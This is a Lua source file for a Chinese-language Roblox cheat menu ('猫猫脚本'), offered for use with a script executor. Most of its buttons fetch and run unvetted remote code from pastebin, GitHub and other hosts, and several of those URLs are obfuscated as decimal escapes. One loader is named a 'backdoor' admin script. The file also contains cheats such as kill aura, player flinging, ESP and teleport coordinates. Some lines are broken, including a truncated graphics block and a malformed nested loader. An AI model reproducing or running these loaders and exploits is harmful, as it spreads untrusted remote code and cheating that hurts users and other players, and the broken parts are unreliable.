local CoreGui = game:GetService("StarterGui")

 CoreGui:SetCore("SendNotification", { 
     Title = "已启动", 
     Duration = 5,  
 })

 CoreGui:SetCore("SendNotification", { 
     Title = "猫猫脚本", 
     Text = "反挂机已开启", 
     Duration = 5,  
 })
local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "猫猫脚本1.31", HidePremium = false,SaveConfig = true,IntroText = "猫猫脚本1.31",ConfigFolder = "bing"})

OrionLib:MakeNotification({
    Name = "猫猫脚本",
    Content = "尽情的享受吧!",
    Image = "rbxassetid://4483345998",
    Time = 5
})

local CreatorTab = Window:MakeTab({
    Name = "关于📷",
    Icon = "rbxassetid://12829115000",
    PremiumOnly = false
})

CreatorTab:AddDropdown({
    Name = "作者",
    Default = "1",
    Options = {"创作者:猫猫脚本作者", "QQ号:3290274245"},
    Callback = function(Value)
        print(Value)
    end    
})

CreatorTab:AddButton({
	Name = "复制QQ号",
	Callback = function()
      		print("button pressed")
      setclipboard("3290274245")
  	end    
})

CreatorTab:AddParagraph("当前版本:","1.31")

local Section = CreatorTab:AddSection({
    Name = "更新日志📈"
})

CreatorTab:AddDropdown({
    Name = "更新日志",
    Default = "1",
    Options = {"猫猫脚本1.2-更新Doors困难模式","猫猫脚本1.25-更新光影 CW 通用 其他创作者脚本 鲨口逃生2 反挂机","猫猫脚本1.27-更新了一点汉化","通用更新 Doors娱乐更新","猫猫脚本1.31-更新steep steps200米"},
    Callback = function(Value)
        print(Value)
    end    
})

local playerTab = Window:MakeTab({
    Name = "玩家🐵",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = playerTab:AddSection({
    Name = "通用💠"
})

playerTab:AddButton({
    Name = "飞行",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/JEdkPtA1'))()
      end    
})

playerTab:AddTextbox({
    Name = "速度(原数17)",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
        print(Value)
    end      
})

playerTab:AddTextbox({
    Name = "跳跃高度(原数50)",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
    end
})

playerTab:AddTextbox({
    Name = "重力设置",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        game.Workspace.Gravity = Value
    end
})

local Section = playerTab:AddSection({
    Name = "颜色"
})

playerTab:AddColorpicker({
    Name = "颜色选择器",
    Default = Color3.fromRGB(255, 0, 0),
    Callback = function(Value)
        print(Value)
    end      
})

playerTab:AddButton({
	Name = "别人控制自己",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet(('https://pastefy.ga/a7RTi4un/raw'),true))()
  	end    
})

playerTab:AddButton({
	Name = "点击传送",
	Callback = function()
      		print("button pressed")
      mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "点击传送" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack
  	end    
})

playerTab:AddButton({
	Name = "动作",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://pastebin.com/raw/HrXgGiND"))()
  	end    
})

playerTab:AddButton({
	Name = "管理员",
	Callback = function()
      		print("button pressed")
      loadstring(game: HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
  	end    
})

playerTab:AddButton({
	Name = "回满血(有些服务器不行)(可能是假血)",
	Callback = function()
      		print("button pressed")
      FullHealth = 10000000
    game.Players.LocalPlayer.Character.Humanoid.Health = FullHealth
  	end    
})

local OtherTab = Window:MakeTab({
    Name = "其他🌐",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = OtherTab:AddSection({
    Name = "脚本📄"
})

OtherTab:AddButton({
    Name = "透视人物",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/gJ2dUpXy'))()
      end    
})

OtherTab:AddButton({
    Name = "吸人(谨慎使用)",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/PVPFXqtH'))()
      end    
})

OtherTab:AddButton({
    Name = "甩人(谨慎使用)",
    Callback = function()
              print("button pressed")
    loadstring(game:HttpGet('https://pastebin.com/raw/dFsFLk3C'))()
      end    
})

OtherTab:AddToggle({
    Name = "夜视",
    Default = false,
    Callback = function(Value)
        if Value then
            game.Lighting.Ambient = Color3.new(1, 1, 1)
        else
            game.Lighting.Ambient = Color3.new(0, 0, 0)
        end
    end
})

OtherTab:AddButton({
    Name = "人物无敌",
    Callback = function()
     loadstring(game:HttpGet('https://pastebin.com/raw/H3RLCWWZ'))()
    end    
})

OtherTab:AddButton({
    Name = "隐身(E)",
    Callback = function()
     loadstring(game:HttpGet('https://pastebin.com/raw/nwGEvkez'))()
      end    
})

OtherTab:AddButton({
	Name = "飞车",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://pastebin.com/raw/MmtcyVTr"))()
  	end    
})

OtherTab:AddButton({
	Name = "伪名说话",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet(('https://pastebin.com/raw/CFUYX9dF'),true))()
  	end    
})

OtherTab:AddButton({
	Name = "踏空行走",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
  	end    
})

OtherTab:AddButton({
	Name = "爬墙",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
  	end    
})

OtherTab:AddButton({
	Name = "自己旋转",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
  	end    
})

OtherTab:AddButton({
	Name = "不会屏蔽消息的发消息机",
	Callback = function()
      		print("button pressed")
      loadstring(game:GetObjects("rbxassetid://1262435912")[1].Source)()
  	end    
})



local Section = OtherTab:AddSection({
    Name = "画质🌈"
})

OtherTab:AddButton({
    Name = "光影v4(曝光警告)",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/gUceVJig'))()
      end    
})

OtherTab:AddButton({
    Name = "RTX高仿",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/Bkf0BJb3'))()
      end    
})

OtherTab:AddButton({
	Name = "国外高质量光影菜单",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet(('https://pastefy.ga/xXkUxA0P/raw'),true))()
  	end    
})

OtherTab:AddButton({
	Name = "光影(滤镜)",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
  	end    
})

OtherTab:AddButton({
	Name = "美丽天空(有动态阴影)",
	Callback = function()
      		print("button pressed")
      -- Roblox Graphics Enhancher
    local light = game.Lighting
    for i, v in pairs(light:GetChildren()) do
      v:Destroy()
    end

    local ter = workspace.Terrain
    local color = Instance.new("ColorCorrectionEffect")
    local bloom = Instance.new("BloomEffect")
    local sun = Instance.new("SunRaysEffect")
    local blur = Inst
  	end    
})
local Section = OtherTab:AddSection({
    Name = "黑客菜单(谨慎使用)📟"
})

OtherTab:AddButton({
    Name = "1x1x1x1",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/GGqN3MRL'))()
      end    
})

local BFTab = Window:MakeTab({
    Name = "blox fruit👊",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = BFTab:AddSection({
    Name = "BF✊"
})

BFTab:AddButton({
    Name = "BF装13脚本",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/MaxFast"))()
      end    
})

BFTab:AddButton({
    Name = "BF脚本(需密钥)",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
      end    
})

BFTab:AddButton({
    Name = "HOHO BF脚本",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet("loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()"))()
      end    
})

local DoorsTab = Window:MakeTab({
    Name = "doors［👁］🇨🇳",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = DoorsTab:AddSection({
    Name = "Doors🚪"
})

DoorsTab:AddButton({
    Name = "KINGHUB",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet(('https://pastebin.com/raw/R8QMbhzv')))()
      end    
})

DoorsTab:AddButton({
    Name = "Doors自走A-1000",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/wjNJccfz'))()
      end    
})

DoorsTab:AddButton({
    Name = "screech抱枕 pss~",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/W6LhkY6r'))()
      end    
})

DoorsTab:AddButton({
    Name = "冰脚本-Doors",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/iRvZnnke'))()
      end    
})

DoorsTab:AddButton({
    Name = "穿墙无拉回",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet("https://github.com/DXuwu/OK/raw/main/clip"))()
      end    
})

DoorsTab:AddButton({
	Name = "Doors绘图显示",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/doors1"))()
  	end    
})

local Section = DoorsTab:AddSection({
    Name = "其他/娱乐🎮"
})

DoorsTab:AddButton({
    Name = "变身q隐藏r退回变身(手机请用键盘脚本)",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))();
      end    
})

DoorsTab:AddButton({
    Name = "十字架(不可封印怪物)",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://raw.githubusercontent.com/PenguinManiack/Crucifix/main/Crucifix.lua'))()local WaterMark = game:GetService("CoreGui").RobloxGui:FindFirstChildOfClass("ScreenGui")if not WaterMark then else    WaterMark:Destroy()end
      end    
})

DoorsTab:AddButton({
    Name = "十字架拆酒店（按q）",
    Callback = function()
              print("button pressed")
      _G.Uses = 10000
_G.Range = 999
_G.OnAnything = true
_G.Fail = false
loadstring(game:HttpGet('https://raw.githubusercontent.com/PenguinManiack/Crucifix/main/Crucifix.lua'))() 
      end    
})

DoorsTab:AddButton({
    Name = "困难模式",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://raw.githubusercontent.com/Ukazix/impossible-mode/main/Protected_79.lua.txt'))()
      end    
})

DoorsTab:AddButton({
    Name = "困难模式2",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://pastebin.com/raw/p89jKRmA'))()
      end    
})

DoorsTab:AddButton({
	Name = "磁铁",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/MagnetByNerd.lua"))()
  	end    
})
DoorsTab:AddButton({
	Name = "可以清东西的枪",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Laser%20Gun"))()
  	end    
})

DoorsTab:AddButton({
	Name = "可以破坏酒店的剪刀",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/shears_done.lua"))()
  	end    
})

DoorsTab:AddButton({
	Name = "骷髅钥匙",
	Callback = function()
      		print("button pressed")
      local item = game:GetObjects("rbxassetid://11697889137")[1]item.Parent = game.Players.LocalPlayer.Backpack
  	end    
})

DoorsTab:AddButton({
	Name = "紫色无限手电筒(在电梯买东西的时候使用)",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Purple%20Flashlight"))()
  	end    
})

DoorsTab:AddButton({
	Name = "手电筒(没电时会有bug)",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Normal%20Flashlight"))()
  	end    
})

local FETab = Window:MakeTab({
    Name = "FE⚙",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = FETab:AddSection({
    Name = "FE🛠"
})

FETab:AddButton({
    Name = "FE",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
      end    
})

local boatTab = Window:MakeTab({
    Name = "造船寻宝⛵️",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = boatTab:AddSection({
    Name = "造船寻宝🚤"
})

boatTab:AddButton({
    Name = "刷钱(不可取消)",
    Callback = function()
              print("button pressed")
       loadstring(game:HttpGet(('https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.lua'),true))()
      end    
})

local gunTab = Window:MakeTab({
    Name = "兵工厂🗿",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = gunTab:AddSection({
    Name = "脚本📃"
})

gunTab:AddButton({
    Name = "脚本(搬)",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet(("https://darkhub.xyz/remote-script.lua"), true))()
      end    
})

local keyboardTab = Window:MakeTab({
    Name = "伪电脑⌨",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = keyboardTab:AddSection({
    Name = "伪电脑脚本⌨"
})

keyboardTab:AddButton({
    Name = "键盘脚本",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
      end    
})

keyboardTab:AddButton({
	Name = "鼠标脚本",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet(('https://pastefy.ga/V75mqzaz/raw'),true))()
  	end    
})

local woodTab = Window:MakeTab({
    Name = "伐木大亨2📖",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = woodTab:AddSection({
    Name = "伐木脚本👾"
})

woodTab:AddButton({
    Name = "伐木脚本(搬)需配合键盘脚本",
    Callback = function()
              print("button pressed")
      loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/butter-hub/main/Butterhub.txt'))()
      end    
})

local steepTab = Window:MakeTab({
    Name = "STEEP STEPS🧗‍♂️",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local Section = steepTab:AddSection({
    Name = "传送☄"
})

steepTab:AddParagraph("如何传送成功教程","在FE中输入tptool，拿着物品即可点击传送，从一个地方一直传送很远的地方直到系统自动重生就可以")

local Section = steepTab:AddSection({
    Name = "第一维度⛰"
})

steepTab:AddButton({
    Name = "100米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-64.00015258789062, 377.9997863769531, -495)
      end    
})

steepTab:AddButton({
    Name = "200米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-449.999755859375, 716.005126953125, -317.0000305175781)
      
      end    
})

steepTab:AddButton({
    Name = "300米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-523, 1071.004638671875, -125)
      
      end    
})

steepTab:AddButton({
    Name = "400米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-485.36199951171875, 1428.4996337890625, -412.2453308105469)
      
      end    
})

steepTab:AddButton({
    Name = "500米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-790.0836181640625, 1806.4996337890625, -721.1473388671875)
      
      end    
})

steepTab:AddButton({
    Name = "600米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-706.7542724609375, 2147, -584.2627563476562)
      
      end    
})

steepTab:AddButton({
    Name = "700米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-1506.5, 2498.4716796875, -752)
      
      end    
})

steepTab:AddButton({
    Name = "800米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-1404.5, 2859.5693359375, -1326.5)
      
      end    
})

steepTab:AddButton({
    Name = "900米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-1111.5, 3215.467041015625, -1655.5)
      
      end    
})

steepTab:AddButton({
    Name = "1000米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-1007.5, 3552.466552734375, -999.5)
      
      end    
})

local Section = steepTab:AddSection({
    Name = "第二维度🏔"
})
steepTab:AddButton({
    Name = "100米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(446.9700012207031, 364.9999084472656, -496.38238525390625)
      end    
})

steepTab:AddButton({
    Name = "200米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(429.0002746582031, 716.005126953125, -1182.0001220703125)
      end    
})

steepTab:AddButton({
    Name = "300米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(308.000244140625, 1122.0048828125, -1624)
      end    
})

steepTab:AddButton({
    Name = "400米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(815.0003051757812, 1429.0048828125, -2095)
      end    
})

steepTab:AddButton({
    Name = "500米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(1026.000244140625, 1786.005126953125, -2831)
      end    
})

steepTab:AddButton({
    Name = "600米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(894.2503051757812, 2143.5048828125, -3628)
      end    
})

steepTab:AddButton({
    Name = "700米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-39.999820709228516, 2502.204833984375, -3415)
      end    
})

steepTab:AddButton({
    Name = "800米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-941.499755859375, 2863.5048828125, -3219.50048828125)
      end    
})

steepTab:AddButton({
    Name = "900米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-1512.5001220703125, 3214.5048828125, -2700.00048828125)
      end    
})

steepTab:AddButton({
    Name = "1000米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-2278.95556640625, 3574.524658203125, -2679.694091796875)
      end    
})

local Section = steepTab:AddSection({
    Name = "第三维度🌵"
})

steepTab:AddButton({
    Name = "100米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(-231.11744689941406, 359.9999084472656, -829.4798583984375)
      end    
})

steepTab:AddButton({
    Name = "200米",
    Callback = function()
              print("button pressed")
      game.Players.localPlayer.Character.HumanoidRootPart.CFrame  = CFrame.new(56.248634338378906, 748.9998168945312, -1532.13232421875)
      end    
})

local CWTab = Window:MakeTab({
	Name = "CW🥊",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

CWTab:AddButton({
	Name = "杀戳光环",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://projecthook.xyz/scripts/free.lua"))()loadstring(game:HttpGet("https://raw.githubusercontent.com/IsaaaKK/cwhb/main/cw.txt"))()
  	end    
})

CWTab:AddButton({
	Name = "脚本1",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/master/novahub"))()
  	end    
})

CWTab:AddButton({
	Name = "脚本2",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/SussyImposterRed/Scripts/main/NOVA_HUB_SOURCE"))()

  	end    
})

local S2Tab = Window:MakeTab({
	Name = "鲨口逃生2🦈",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

S2Tab:AddDropdown({
	Name = "选择你的免费船",
	Default = "1",
	Options = {"无", "DuckyBoatBeta", "DuckyBoat", "BlueCanopyMotorboat", "BlueWoodenMotorboat", "UnicornBoat", "Jetski", "RedMarlin", "Sloop", "TugBoat", "SmallDinghyMotorboat", "JetskiDonut", "Marlin", "TubeBoat", "FishingBoat", "VikingShip", "SmallWoodenSailboat", "RedCanopyMotorboat", "Catamaran", "CombatBoat", "TourBoat", "Duckmarine", "PartyBoat", "MilitarySubmarine",  "GingerbreadSteamBoat", "Sleigh2022", "Snowmobile", "CruiseShip"},
	Callback = function(Value)
local ohString1 = (Value)
game:GetService("ReplicatedStorage").EventsFolder.BoatSelection.UpdateHostBoat:FireServer(ohString1)
	end    
})

local OCTab = Window:MakeTab({
	Name = "其他创作者脚本🇨🇳",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

OCTab:AddButton({
	Name = "脚本中心1.5",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()'))()
  	end    
})

OCTab:AddButton({
	Name = "微山2.32",
	Callback = function()
      		print("button pressed")
      --微山doors 2.3.2(愚人节快乐)
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\117\72\72\112\56\102\122\83"))()
  	end    
})

OCTab:AddButton({
	Name = "白脚本",
	Callback = function()
      		print("button pressed")
      _G["白脚本作者修狗"]="xdjhadgdsrfcyefjhsadcctyseyr6432478rudghfvszhxcaheey"loadstring(game:HttpGet(('https://raw.githubusercontent.com/wev666666/baijiaobengV2.0beta/main/%E7%99%BD%E8%84%9A%E6%9C%ACbeta'),true))()
  	end    
})

OCTab:AddButton({
	Name = "阿尔宙斯V3",
	Callback = function()
      		print("button pressed")
      loadstring(game: HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
  	end    
})

OCTab:AddButton({
	Name = "脚本中心1.54",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
  	end    
})

OCTab:AddButton({
	Name = "龙脚本",
	Callback = function()
      		print("button pressed")
      genv().long = "龙脚本，加载时间长请耐心"loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\108\121\121\97\105\110\105\47\108\111\110\47\109\97\105\110\47\108\105\115\119\109\34\41\41\40\41")()
  	end    
})

OrionLib:Init()